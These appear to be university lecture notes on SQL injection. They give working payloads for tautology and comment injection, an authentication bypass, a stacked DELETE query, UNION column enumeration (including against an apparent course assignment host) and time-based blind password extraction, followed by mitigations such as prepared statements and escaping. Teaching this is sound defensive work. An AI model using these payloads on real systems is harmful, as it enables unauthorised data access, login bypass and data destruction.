# SQL Injection



### Injection Attacks

* Any user input / controlled data can be used to perform the attack
* Can be thought of as a user injecting malicious information into an application
* #1 of the OWASP Top 10 (2017)
* XSS is also an injection attack
  * It is a major vulnerability, so it gets its own category!
* Main cause, poor sanitisation of user input and input validation



### SQL Injection

* Interfere with queries made to a database
* Manipulate them to perform unauthorised operations
* Operations may include (not limited to):
  * Retrieving data
  * Modifying data
  * Removing data
  * Create a shell to execute operating system commands
  * Gain access to files on the server’s file system
  * Escalate privileges from lower privilege user to root (old databases)



### Basic SQL Query

```
SELECT * FROM users
SELECT * FROM users WHERE email = ‘sajeeb.lohani@unimelb.edu.au’

Python:
“SELECT * FROM users WHERE email=‘” + request.args[‘email’] + “’;”

PHP:
“SELECT * FROM users WHERE email=‘” + $_GET[‘email’] + “’;”
```

Using Python from here on

URL entered:

```
https://test.com/find_user?email=sajeeb.lohani@unimelb.edu.au
```

SQL query becomes:

```
“SELECT * FROM users WHERE email=‘sajeeb.lohani@unimelb.edu.au’;”
```

Query selects all rows with sajeeb.lohani@unimelb.edu.au



#### Comment

URL entered:

```
https://test.com/find_user?email=sajeeb.lohani@unimelb.edu.au’ or 1=1 --
```

SQL query becomes:

```
“SELECT * FROM users WHERE email=‘sajeeb.lohani@unimelb.edu.au’ or 1=1 -- ’;”
```

Query selects all rows with sajeeb.lohani@unimelb.edu.au and all other rows too

* 1=1 is a tautology
* -- comments out the remainder of the query (ignored by the database)
* (other possible comments include, #, //, /*)

http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet



#### No Comment

URL entered:

```
https://test.com/find_user?email=sajeeb.lohani@unimelb.edu.au’ or ‘1’=‘1
```

SQL query becomes:

```
“SELECT * FROM users WHERE email=‘sajeeb.lohani@unimelb.edu.au’ or ‘1’=‘1’;”
```

1=1 is a tautology -> Completes the query without causing an error



#### Authentication

Python:

```
“SELECT * FROM users WHERE email=‘” + request.args[‘email’] + “’ AND password = ’” + request.args[‘password’] + “’;”
```

URL entered:

```
https://test.com/find_user?email=sajeeb.lohani@unimelb.edu.au&password=password

Bypass:
https://test.com/find_user?email=sajeeb.lohani@unimelb.edu.au’ or 1=1 -- &password=password

If the application checks if only one user is retrieved:
URL entered: https://test.com/find_user?email=sajeeb.lohani@unimelb.edu.au’ 
or 1=1 LIMIT 1 -- &password=password
```

SQL query becomes:

```
“SELECT * FROM users WHERE email=‘sajeeb.lohani@unimelb.edu.au’ AND password = ’password’;”

Bypass:
“SELECT * FROM users WHERE email=‘sajeeb.lohani@unimelb.edu.au’ or 1=1 -- ’ 
AND password = ’password’;”

If the application checks if only one user is retrieved:
“SELECT * FROM users WHERE email=‘sajeeb.lohani@unimelb.edu.au’ or 1=1 LIMIT 1 -- ’ 
AND password = ’password’;”
```

Ignores the error and retrieves the whole User table.



#### Stacked Queries

* Just like in DOTA, stacking items or like pancakes, stacking pancakes!
* Using a second query after completing the first
* Still requires to be syntactically correct
* Uses the ‘;’ (semicolon) character
* Query stacking doesn’t work in all languages as mitigations are built-in. The interface communicating
  with the DB mitigates this issue.

URL entered:

```
https://test.com/find_user?email=sajeeb.lohani@unimelb.edu.au’ or 1=1 LIMIT 1; 
DELETE FROM users where email = ‘admin@admin.com’ -- &password=password
```

SQL query becomes:

```
“SELECT * FROM users WHERE email=‘sajeeb.lohani@unimelb.edu.au’ or 1=1 LIMIT 1; 
DELETE FROM users where email = ‘admin@admin.com’ -- ’ AND password = ’password’;”
```

Ignores the error and retrieves the whole User table. Deletes the admin@admin.com account from the database.



#### Union Queries

* Extracting additional information
* Works like union of sets (A U B = A + B)
* Requires the same number of columns (otherwise will cause a syntax error)

<img src="img\7\1.png" alt="1" style="zoom:80%;" />

##### How to find columns

```
http://fakesite.com/report.php?id=23 union select 1--+
http://fakesite.com/report.php?id=23 union select 1,2,3,4--+
http://fakesite.com/report.php?id=23 union select 1,2,3,4,5--+

https://assignment-dusty-rose.unimelb.life/search.php?search=ball%27union%20select%20null,%20null,%20null,%20null,%20null,%20null
```



### Blind SQL Injection

* Completely blind
* Only Boolean output received
* Using sleeps and ifs

#### Extracting Password

```
“SELECT TrackingId FROM TrackedUsers WHERE TrackingId = ‘” + request.args[‘id’] + ”’”

123’ union select 1 from users where username = ‘administrator’ and if(substring(password, 1, 1) = ‘a’, sleep(3), sleep(0)) --

SELECT TrackingId FROM TrackedUsers WHERE TrackingId = ‘123’ 
union select 1 from users where username = ‘administrator’ 
and if(substring(password, 1, 1) = ‘a’, sleep(3), sleep(0)) -- ’

SELECT TrackingId FROM TrackedUsers WHERE TrackingId = ‘123’ 
union select 1 from users where username = ‘administrator’ 
and if(substring(password, 1, 1) = ‘b’, sleep(3), sleep(0)) -- ’

SELECT TrackingId FROM TrackedUsers WHERE TrackingId = ‘123’ 
union select 1 from users where username = ‘administrator’ 
and if(substring(password, 1, 2) = ‘pa’, sleep(3), sleep(0)) -- ’
```

* Request will take longer to respond
* Measuring response time will show 3 second delay



### SQL Wildcard Attacks

* Uses the wildcard operator (%) in SQL
* Usually requires the SQL ‘LIKE’ comparison operator
* Can be used to leak the DB in a limited fashion
* Does not provide column and table support like SQL Injection attacks

Gets all rows where TrackingId starts with 123:

```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = ‘123%’
```

Gets all rows where TrackingId starts with anything and ends with anything

```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = ‘%%’
```

This is a tautology, so leaks the whole DB.



### SQL Injections Mitigations

* Prepared Statements
* Stored Procedures
* White List Input Validation
* Escaping User Input
* WAF
* Blacklisting Input

#### Prepared Statements

* Allows the server to handle compiling of the statement and execution
* No need to worry about quotes and inputting variables
* Still requires values to be sanitised for other vulnerabilities
* Not completely idiot proof

```
statement = prepareStatement(“SELECT * FROM users WHERE email = ?”)
statement.setValue(0, “admin@admin.com”)
statement.execute()
```

* Prepared statements and parameterised queries are very similar (but not the same).

#### Stored Procedures

* Stored queries or procedures within the database
* Offers the same protection as a prepare statement

#### Whitelisting Values

* Whitelisting or picking acceptable values

```
if (request.args[‘order’] == “asc”):
	order = “asc”
else:
	order = “desc”
```

* This is not good as the developer needs to predict values of variables. Will not work for all queries.
* Can be good as an additional measure for security

#### Escaping User Input

* Escaping user content by adding ’\’ (backslash) in front of quotes and apostrophes.
* Can also use encoding of information (URL / HTML)
* Can be tricky with things like wildcards

#### WAF

* Once again, just an extra layer of protection!
* Won’t stop targeted attacks from skilled individuals

#### Blacklisting Input

```
if (“%” in request.args[‘order’]):
	exit()
```

* Only caters for cases which the developer thinks of.
* Can work for things like SQL wildcard attacks though